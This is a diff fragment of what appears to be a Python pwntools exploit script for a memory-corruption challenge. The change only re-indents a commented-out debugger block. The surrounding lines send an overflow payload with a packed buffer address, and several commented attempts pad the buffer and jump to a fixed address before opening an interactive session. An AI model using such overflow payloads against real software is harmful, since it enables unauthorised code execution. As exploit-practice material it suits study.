@@ -25,8 +25,8 @@ print(pload)
 #p.send(b'a' * 0x84 + p64(0x080485b9))
 p.send(pload+p32(bufadd))
 #gdb.attach(p, gdbscript=f'''
-#            attach {p.__getattr__('pid')}
-#           ''')
+#      attach {p.__getattr__('pid')}
+#       ''')
 #p.send(b'a' * 0x88 + p32(0x080485b9))
 p.interactive()
 
